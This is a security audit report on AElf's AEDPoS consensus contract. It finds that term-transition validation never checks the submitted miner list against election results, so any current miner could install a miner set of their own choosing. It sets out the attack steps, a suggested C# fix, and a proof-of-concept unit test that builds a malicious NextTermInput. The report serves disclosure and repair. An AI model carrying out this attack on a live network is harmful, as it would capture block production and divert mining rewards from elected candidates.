# Audit Report

## Title
Missing Miner List Validation in NextTerm Allows Arbitrary Miner Installation During Term Transitions

## Summary
The `ValidationForNextTerm()` function in the AEDPoS consensus contract fails to verify that the miner list provided in `NextTerm` transactions matches the election results from the Election contract. This allows any current miner to bypass the democratic election mechanism and install an arbitrary set of miners for the next term, gaining complete control over block production and mining rewards.

## Finding Description

The AEDPoS consensus system is designed to transition between terms using miner lists determined by the Election contract's voting mechanism. However, the validation logic for term transitions contains a critical gap that allows this security guarantee to be bypassed.

**The Legitimate Flow:**

When generating a proper term transition, the contract calls `TryToGetVictories()` to retrieve the elected miner list from the Election contract [1](#0-0) , and the `IsMinerListJustChanged` flag is always set to true when a new miner list is generated [2](#0-1) .

**The Vulnerability:**

During validation, `ValidationForNextTerm()` only checks that term and round numbers increment correctly, but performs no validation of the miner list content or the `IsMinerListJustChanged` flag [3](#0-2) .

During execution, `ProcessNextTerm()` directly extracts the miner list from the attacker-provided input without any cross-check against Election contract results [4](#0-3) .

The `SetMinerList()` function only checks whether a miner list already exists for that term, not whether it matches election results [5](#0-4) .

**Attack Execution:**

A malicious current miner can:
1. Wait until term transition time
2. Construct a `NextTermInput` with correct term number (current + 1) and round number (current + 1), but with an arbitrary `RealTimeMinersInformation` dictionary containing attacker-controlled public keys
3. Call the public `NextTerm()` method [6](#0-5) 
4. Pass `PreCheck()` which only verifies the sender is a current/previous miner [7](#0-6) 
5. Pass validation which only checks term/round number increments
6. The arbitrary miner list gets installed and persists for the entire term

## Impact Explanation

This vulnerability completely subverts the election-based consensus mechanism that is fundamental to AElf's governance model. The impact is severe:

**Consensus Integrity Break**: The core security guarantee that miners are democratically elected is violated. An attacker gains the ability to unilaterally determine who can produce blocks for an entire term (approximately 7 days).

**Mining Reward Theft**: All mining rewards for the compromised term are redirected to the attacker's chosen addresses instead of legitimately elected candidates. The system generates mining rewards per block and donates them to Treasury [8](#0-7) , representing significant economic damage over a full term.

**Governance Capture**: By controlling the miner set, the attacker effectively controls block production, transaction inclusion, and can potentially influence other governance mechanisms that depend on miner participation.

**Legitimate Candidates Disenfranchised**: Candidates who won the election and should rightfully be miners are completely excluded, undermining the democratic nature of the network.

This is **HIGH severity** because it breaks a critical security invariant of the consensus system with lasting effects across an entire term.

## Likelihood Explanation

**Attacker Requirements**: The attacker must be a current or previous miner, which means they already have block production privileges. While this is a privileged position, the threat model for consensus systems must consider malicious miners (Byzantine fault tolerance).

**Attack Complexity**: LOW - The attack is straightforward to execute:
- The timing window is predictable (based on blockchain age and configured term duration)
- Constructing the malicious `NextTermInput` requires only copying the legitimate structure but replacing the miner public keys
- No complex cryptographic operations or multi-step coordination required

**Feasibility**: HIGH - The only race condition is ensuring the malicious transaction is included before any honest miner's `NextTerm` transaction. However, as a current miner, the attacker has privileged access to propose this transaction in their own block.

**Detection**: The attack leaves no immediate trace during validation since all checks pass. It would only be discovered when the wrong miners start producing blocks in the new term, by which point the damage is done.

**Overall Likelihood**: MEDIUM-HIGH - Any malicious current miner can execute this attack during each term transition, making it a realistic and significant threat.

## Recommendation

Add validation in `ValidationForNextTerm()` to cross-check the provided miner list against the Election contract's `GetVictories()` result. The validation should:

1. Call the Election contract to retrieve the current election winners
2. Compare the miner list in the `NextTermInput` against the election results
3. Reject the transaction if the miner lists do not match

Additionally, validate that `IsMinerListJustChanged` is set to `true` for term transitions, as this flag indicates that the miner list was legitimately generated from election results.

Example fix for `ValidationForNextTerm()`:

```csharp
private ValidationResult ValidationForNextTerm(ConsensusValidationContext validationContext)
{
    var extraData = validationContext.ExtraData;
    var validationResult = ValidationForNextRound(validationContext);
    if (!validationResult.Success) return validationResult;

    // Check term number increment
    if (validationContext.BaseRound.TermNumber.Add(1) != extraData.Round.TermNumber)
        return new ValidationResult { Message = "Incorrect term number for next round." };

    // ADDED: Validate IsMinerListJustChanged flag
    if (!extraData.Round.IsMinerListJustChanged)
        return new ValidationResult { Message = "Miner list must be marked as changed for term transition." };

    // ADDED: Validate miner list matches election results (on main chain)
    if (State.IsMainChain.Value && State.ElectionContract.Value != null)
    {
        var victories = State.ElectionContract.GetVictories.Call(new Empty());
        var expectedMiners = victories.Value.Select(v => v.ToHex()).OrderBy(k => k).ToList();
        var providedMiners = extraData.Round.RealTimeMinersInformation.Keys.OrderBy(k => k).ToList();
        
        if (!expectedMiners.SequenceEqual(providedMiners))
            return new ValidationResult { Message = "Miner list does not match election results." };
    }

    return new ValidationResult { Success = true };
}
```

## Proof of Concept

The following test demonstrates the vulnerability by showing that a current miner can call `NextTerm()` with an arbitrary miner list that differs from the election results:

```csharp
[Fact]
public async Task NextTerm_WithArbitraryMinerList_ShouldFail_ButDoesNot()
{
    // Setup: Initialize consensus with initial miners
    var initialMiners = new[] { InitialCoreDataCenterKeyPairs[0], InitialCoreDataCenterKeyPairs[1] };
    await InitializeConsensus(initialMiners);
    
    // Get election victories (legitimate miner list)
    var victories = await ElectionContractStub.GetVictories.CallAsync(new Empty());
    var legitimateMiners = victories.Value.Select(v => v.ToHex()).ToList();
    
    // Current miner creates malicious NextTermInput with DIFFERENT miner list
    var attackerKeyPair = InitialCoreDataCenterKeyPairs[0];
    var maliciousMinerKeys = new[] { 
        SampleECKeyPairs.KeyPairs[10].PublicKey.ToHex(),  // Attacker-controlled keys
        SampleECKeyPairs.KeyPairs[11].PublicKey.ToHex()
    };
    
    var currentRound = await ConsensusContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    
    // Create malicious round with arbitrary miners
    var maliciousRound = new Round
    {
        RoundNumber = currentRound.RoundNumber + 1,
        TermNumber = currentRound.TermNumber + 1,
        IsMinerListJustChanged = false,  // Not even setting this correctly
        RealTimeMinersInformation = {
            { maliciousMinerKeys[0], new MinerInRound { Pubkey = maliciousMinerKeys[0], Order = 1 } },
            { maliciousMinerKeys[1], new MinerInRound { Pubkey = maliciousMinerKeys[1], Order = 2 } }
        }
    };
    
    // Attacker calls NextTerm with arbitrary miner list
    var miner = GetConsensusContractTester(attackerKeyPair);
    var randomNumber = await GenerateRandomProofAsync(attackerKeyPair);
    var maliciousInput = NextTermInput.Create(maliciousRound, randomNumber);
    
    // VULNERABILITY: This should fail but succeeds
    var result = await miner.NextTerm.SendAsync(maliciousInput);
    
    // Verify the attack succeeded
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Confirm arbitrary miner list was installed
    var newMinerList = await ConsensusContractStub.GetCurrentMinerList.CallAsync(new Empty());
    newMinerList.Pubkeys.Select(p => p.ToHex()).ShouldBe(maliciousMinerKeys);
    
    // Confirm it does NOT match election results
    newMinerList.Pubkeys.Select(p => p.ToHex()).ShouldNotBe(legitimateMiners);
}
```

This test proves that a current miner can install an arbitrary miner list that completely bypasses the election mechanism, demonstrating the critical security vulnerability.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L228-228)
```csharp
        if (TryToGetVictories(out var victories))
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/MinerList.cs (L42-42)
```csharp
        round.IsMinerListJustChanged = true;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L37-47)
```csharp
    private ValidationResult ValidationForNextTerm(ConsensusValidationContext validationContext)
    {
        var extraData = validationContext.ExtraData;
        var validationResult = ValidationForNextRound(validationContext);
        if (!validationResult.Success) return validationResult;

        // Is next term number correct?
        return validationContext.BaseRound.TermNumber.Add(1) != extraData.Round.TermNumber
            ? new ValidationResult { Message = "Incorrect term number for next round." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L188-190)
```csharp
        var miners = new MinerList();
        miners.Pubkeys.AddRange(nextRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
        if (!SetMinerList(miners, nextRound.TermNumber)) Assert(false, "Failed to update miner list.");
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L316-331)
```csharp
    private bool PreCheck()
    {
        TryToGetCurrentRoundInformation(out var currentRound);
        TryToGetPreviousRoundInformation(out var previousRound);

        _processingBlockMinerPubkey = Context.RecoverPublicKey().ToHex();

        // Though we've already prevented related transactions from inserting to the transaction pool
        // via ConstrainedAEDPoSTransactionValidationProvider,
        // this kind of permission check is still useful.
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;

        return true;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L13-18)
```csharp
    public override Empty NextTerm(NextTermInput input)
    {
        SupplyCurrentRoundInformation();
        ProcessConsensusInformation(input);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L70-82)
```csharp
    private bool SetMinerList(MinerList minerList, long termNumber, bool gonnaReplaceSomeone = false)
    {
        // Miners for one specific term should only update once.
        var minerListFromState = State.MinerListMap[termNumber];
        if (gonnaReplaceSomeone || minerListFromState == null)
        {
            State.MainChainCurrentMinerList.Value = minerList;
            State.MinerListMap[termNumber] = minerList;
            return true;
        }

        return false;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L107-141)
```csharp
    private bool DonateMiningReward(Round previousRound)
    {
        if (State.TreasuryContract.Value == null)
        {
            var treasuryContractAddress =
                Context.GetContractAddressByName(SmartContractConstants.TreasuryContractSystemName);
            // Return false if Treasury Contract didn't deployed.
            if (treasuryContractAddress == null) return false;
            State.TreasuryContract.Value = treasuryContractAddress;
        }

        var miningRewardPerBlock = GetMiningRewardPerBlock();
        var minedBlocks = previousRound.GetMinedBlocks();
        var amount = minedBlocks.Mul(miningRewardPerBlock);
        State.TreasuryContract.UpdateMiningReward.Send(new Int64Value { Value = miningRewardPerBlock });

        if (amount > 0)
        {
            State.TreasuryContract.Donate.Send(new DonateInput
            {
                Symbol = Context.Variables.NativeSymbol,
                Amount = amount
            });

            Context.Fire(new MiningRewardGenerated
            {
                TermNumber = previousRound.TermNumber,
                Amount = amount
            });
        }

        Context.LogDebug(() => $"Released {amount} mining rewards.");

        return true;
    }
```
